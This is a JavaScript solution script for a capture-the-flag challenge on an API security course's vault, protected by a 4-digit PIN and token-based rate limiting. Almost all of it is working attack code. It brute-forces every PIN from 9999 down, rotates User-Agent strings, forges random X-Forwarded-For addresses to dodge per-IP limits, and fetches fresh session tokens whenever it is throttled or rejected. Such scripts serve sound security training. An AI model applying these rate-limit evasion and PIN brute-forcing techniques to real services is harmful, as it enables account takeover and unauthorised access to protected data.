/*
CHALLENGE DESCRIPTION

We've upgraded our security! Our vault now uses sophisticated token-based rate limiting.

This challenge presents a password vault protected by a 4-digit PIN with advanced token-based rate limiting and session management.

Your mission: Analyze the token management system, find its weakness, and exploit it to bypass the rate limiting and access the vault to retrieve the flag.
*/


const BASE_API_URL = 'https://rate-advanced.ac25.apisecuniversity.com';
const SESSION_API_ENDPOINT = `${BASE_API_URL}/api/session`;
const VAULT_API_ENDPOINT = `${BASE_API_URL}/api/vault`;

const MIN_PIN = 0;
const MAX_PIN = 9999;

const REQUEST_TIMEOUT_MS = 5000;
const BASE_REQUEST_DELAY_MS = 10;
const ERROR_RETRY_DELAY_MS = 3000;
const TOKEN_ERROR_RETRY_DELAY_MS = 10000;
const MAX_TOKEN_FETCH_ATTEMPTS = 5;
const MAX_VAULT_ATTEMPTS_PER_PIN = 3;

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/109.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
];

const BASE_HEADERS = {
  'Accept-Language': 'en-GB,en;q=0.9',
  'Accept': '*/*',
  'Origin': BASE_API_URL,
  'Sec-Fetch-Site': 'same-origin',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Dest': 'empty',
  'Referer': `${BASE_API_URL}/`,
  'Accept-Encoding': 'gzip, deflate, br',
  'Priority': 'u=1, i',
  'Sec-Ch-Ua-Platform': '"Linux"',
  'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
  'Sec-Ch-Ua-Mobile': '?0',
};

const getRandomUserAgent = () => USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

const generateIpAddress = () => {
  const thirdOctet = Math.floor(Math.random() * 255);
  const fourthOctet = Math.floor(Math.random() * 253) + 1;
  return `192.168.${thirdOctet}.${fourthOctet}`;
};
const delay = ms => new Promise(res => setTimeout(res, ms));

const makeHttpRequest = async (url, method, headers = {}, body = null, timeoutMs = REQUEST_TIMEOUT_MS) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);

  const fetchOptions = {
    method: method,
    headers: { ...headers },
    signal: controller.signal,
  };

  if (body) {
    if (fetchOptions.headers['Content-Type'] === 'application/json' && typeof body !== 'string') {
      try {
        fetchOptions.body = JSON.stringify(body);
      } catch (e) {
        clearTimeout(timeoutId);
        return { success: false, status: null, data: null, rawText: '', headers: {}, error: `JSON stringify error: ${e.message}` };
      }
    } else {
      fetchOptions.body = body;
    }
    if (typeof fetchOptions.body === 'string' && !fetchOptions.headers['Content-Length']) {
      fetchOptions.headers['Content-Length'] = Buffer.byteLength(fetchOptions.body).toString();
    }
  }

  try {
    const response = await fetch(url, fetchOptions);
    clearTimeout(timeoutId);

    const responseHeaders = {};
    response.headers.forEach((value, key) => {
      responseHeaders[key] = value;
    });
    const rawText = await response.text();
    let responseData = null;

    if (responseHeaders['content-type']?.includes('application/json')) {
      try {
        responseData = JSON.parse(rawText);
      } catch (e) {
        process.stdout.write('\n');
        console.warn(`JSON parse error from ${url}: ${e.message}. Raw (100 chars): ${rawText.substring(0, 100)}`);
      }
    }

    const httpSuccess = response.status >= 200 && response.status < 300;
    return {
      success: httpSuccess,
      status: response.status,
      data: responseData,
      rawText: rawText,
      headers: responseHeaders,
      error: httpSuccess ? null : `HTTP error ${response.status}`,
    };
  } catch (error) {
    clearTimeout(timeoutId);
    const errorMessage = error.name === 'AbortError' ? `Request timed out after ${timeoutMs / 1000}s` : `Network error: ${error.message}`;
    return { success: false, status: null, data: null, rawText: '', headers: {}, error: errorMessage };
  }
};

const acquireNewAuthToken = async () => {
  const requestBody = { success: true };
  let attempts = 0;

  while (attempts < MAX_TOKEN_FETCH_ATTEMPTS) {
    attempts++;
    const userAgent = getRandomUserAgent();
    process.stdout.write('\n');
    console.log(`Requesting new auth token (UA: ${userAgent.substring(0, 20)}..., attempt ${attempts}/${MAX_TOKEN_FETCH_ATTEMPTS})...`);

    const specificHeaders = {
      ...BASE_HEADERS,
      'User-Agent': userAgent,
      'Content-Type': 'application/json',
    };
    const response = await makeHttpRequest(SESSION_API_ENDPOINT, 'POST', specificHeaders, requestBody);

    if (response.success && response.data?.success && response.data?.token) {
      console.log(`New token acquired: ${response.data.token.substring(0, 10)}...`);
      return response.data.token;
    }

    let waitSeconds = 60;
    if (response.status === 429) {
      const retryAfterHeader = response.headers['retry-after'] || response.headers['ratelimit-reset'];
      if (retryAfterHeader) {
        try {
          waitSeconds = parseInt(retryAfterHeader, 10);
        } catch (e) {}
      } else if (response.data?.retryAfter) {
        try {
          waitSeconds = parseInt(response.data.retryAfter, 10);
        } catch (e) {}
      }
      console.log(`Token acquisition rate limited (429). Waiting ${waitSeconds}s.`);
      await delay(waitSeconds * 1000 + 2000);
    } else {
      const errorDetail = response.data ? JSON.stringify(response.data) : response.rawText.substring(0, 100);
      console.error(`Token acquisition error. Status: ${response.status || 'N/A'}. Details: ${response.error || errorDetail}`);
      if (attempts < MAX_TOKEN_FETCH_ATTEMPTS) {
        console.log(`Retrying token request in ${TOKEN_ERROR_RETRY_DELAY_MS / 1000}s.`);
        await delay(TOKEN_ERROR_RETRY_DELAY_MS);
      }
    }
  }
  process.stdout.write('\n');
  console.error('Max token acquisition attempts reached. Exiting.');
  process.exit(1);
};

const attemptPinWithToken = async (pinCode, authToken, userAgent, ipAddress) => {
  const payload = { pin: pinCode };
  const specificHeaders = {
    ...BASE_HEADERS,
    'X-Session-Token': authToken,
    'User-Agent': userAgent,
    'X-Forwarded-For': ipAddress,
    'Content-Type': 'application/json',
  };
  return makeHttpRequest(VAULT_API_ENDPOINT, 'POST', specificHeaders, payload);
};

const main = async () => {
  let authToken = null;
  let currentPin = MAX_PIN;
  let vaultAttemptRetries = 0;

  while (currentPin >= MIN_PIN) {
    if (!authToken) {
      process.stdout.write('\n');
      console.log(`Auth token missing or invalid. Fetching new token (for PIN ${String(currentPin).padStart(4, '0')})...`);
      authToken = await acquireNewAuthToken();
      console.log(`Token refreshed. Continuing with PIN ${String(currentPin).padStart(4, '0')}.`);
      vaultAttemptRetries = 0;
    }

    const pinString = String(currentPin).padStart(4, '0');
    const userAgent = getRandomUserAgent();
    const ipAddress = generateIpAddress();

    const progressMessage =
      vaultAttemptRetries > 0
        ? `Retrying PIN ${pinString} (IP: ${ipAddress}, attempt ${
            vaultAttemptRetries + 1
          }/${MAX_VAULT_ATTEMPTS_PER_PIN}, Token: ${authToken.substring(0, 6)}...)...\r`
        : `Trying PIN ${pinString} (IP: ${ipAddress}, Token: ${authToken.substring(0, 6)}...)...\r`;
    process.stdout.write(progressMessage);

    let advanceToNextPin = false;
    let retryCurrentPin = false;
    let specificDelayMs = 0;

    const response = await attemptPinWithToken(pinString, authToken, userAgent, ipAddress);

    if (response.success && response.data?.success) {
      process.stdout.write('\n');
      console.log(`PIN ${pinString}: Success!`);
      console.log(JSON.stringify(response.data));
      process.exit(0);
    }

    process.stdout.write('\n');

    switch (response.status) {
      case 401:
        const errorMsg = (response.data?.error || '').toLowerCase();
        if (errorMsg.includes('invalid pin')) {
          console.log(`PIN ${pinString}: Incorrect (401). ${response.data ? JSON.stringify(response.data) : response.rawText}`);
          advanceToNextPin = true;
        } else {
          console.log(`PIN ${pinString}: Auth token invalid (401). Details: ${response.data ? JSON.stringify(response.data) : response.rawText}`);
          authToken = null;
          retryCurrentPin = true;
          specificDelayMs = TOKEN_ERROR_RETRY_DELAY_MS;
        }
        break;
      case 429:
        console.log(`PIN ${pinString}: Vault rate limit (429). Assuming token is exhausted or IP flagged.`);
        authToken = null;
        const retryAfter = response.data?.retryAfter ? parseInt(response.data.retryAfter, 10) : 60;
        specificDelayMs = (isNaN(retryAfter) ? 60 : retryAfter) * 1000 + 2000;
        console.log(`Waiting ${specificDelayMs / 1000}s before token refresh and retrying PIN ${pinString}.`);
        retryCurrentPin = true;
        break;
      case 503:
      case null:
        const errorType = response.status === 503 ? '503 Service Unavailable (vault)' : `Request Error: ${response.error || 'Unknown network issue'}`;
        console.log(`PIN ${pinString} (IP: ${ipAddress}): ${errorType}.`);
        vaultAttemptRetries++;
        if (vaultAttemptRetries >= MAX_VAULT_ATTEMPTS_PER_PIN) {
          console.log(`PIN ${pinString}: Max retries for this error. Moving to next PIN.`);
          advanceToNextPin = true;
        } else {
          console.log(`Retrying PIN ${pinString} in ${ERROR_RETRY_DELAY_MS / 1000}s.`);
          specificDelayMs = ERROR_RETRY_DELAY_MS;
          retryCurrentPin = true;
        }
        break;
      case 500:
      case 502:
      case 504:
        console.error(
          `PIN ${pinString} (IP: ${ipAddress}): Server Error ${response.status}. Details: ${
            response.data ? JSON.stringify(response.data) : response.rawText.substring(0, 100)
          }`
        );
        authToken = null;
        specificDelayMs = TOKEN_ERROR_RETRY_DELAY_MS;
        retryCurrentPin = true;
        break;
      default:
        console.error(
          `PIN ${pinString} (IP: ${ipAddress}): Unexpected Status ${response.status}. Details: ${
            response.data ? JSON.stringify(response.data) : response.rawText.substring(0, 100)
          }`
        );
        authToken = null;
        specificDelayMs = TOKEN_ERROR_RETRY_DELAY_MS;
        retryCurrentPin = true;
        break;
    }

    if (specificDelayMs > 0) {
      await delay(specificDelayMs);
    }

    if (advanceToNextPin) {
      currentPin--;
      vaultAttemptRetries = 0;
    } else if (retryCurrentPin) {
      if (!authToken) {
        console.log(`Token invalidated for PIN ${pinString}. Will refresh before retrying.`);
      }
    } else {
      console.warn(`PIN ${pinString}: Incorrect or unhandled status ${response.status}. Advancing to next PIN.`);
      currentPin--;
      vaultAttemptRetries = 0;
    }

    await delay(BASE_REQUEST_DELAY_MS);
  }

  process.stdout.write('\n');
  console.log('Script finished. All PINs attempted or an unrecoverable error occurred.');
  process.exit(1);
};

main().catch(error => {
  process.stdout.write('\n');
  console.error(`Unhandled application error: ${error.message}`);
  console.error(error.stack);
  process.exit(1);
});
